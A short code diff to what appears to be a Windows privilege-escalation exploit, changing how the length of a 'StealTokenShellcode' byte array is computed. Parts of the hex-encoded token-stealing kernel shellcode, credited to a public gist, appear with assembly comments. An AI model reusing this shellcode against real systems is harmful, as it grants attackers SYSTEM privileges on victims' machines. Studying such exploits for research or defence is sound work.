@@ -208,10 +208,7 @@ void PopupCmd()
 /**
  * Shellcode source: https://gist.github.com/hugsy/763ec9e579796c35411a5929ae2aca27
  */
-
-#define StealTokenShellcodeLength 80
-
-const char StealTokenShellcode[StealTokenShellcodeLength] = ""
+const char StealTokenShellcode[] = ""
         "\x50"                                                      // push rax
         "\x53"                                                      // push rbx
         "\x51"                                                      // push rcx
@@ -233,3 +230,5 @@ const char StealTokenShellcode[StealTokenShellcodeLength] = ""
         "\x48\x31\xc0"                                              // xor rax, rax
         "\xc3"                                                      // ret
         "";
+
+#define StealTokenShellcodeLength sizeof(StealTokenShellcode)
